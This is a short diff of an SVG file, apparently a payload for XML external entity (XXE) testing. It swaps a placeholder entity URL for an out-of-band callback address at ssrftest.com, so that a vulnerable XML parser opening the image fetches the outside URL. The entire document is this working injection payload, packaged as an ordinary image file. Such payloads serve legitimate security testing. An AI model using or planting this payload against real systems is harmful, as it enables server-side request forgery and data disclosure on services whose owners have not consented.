@@ -2,4 +2,4 @@
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "http://ssrftest.com/x/DfKZH">]><foo>&xxe;</foo>
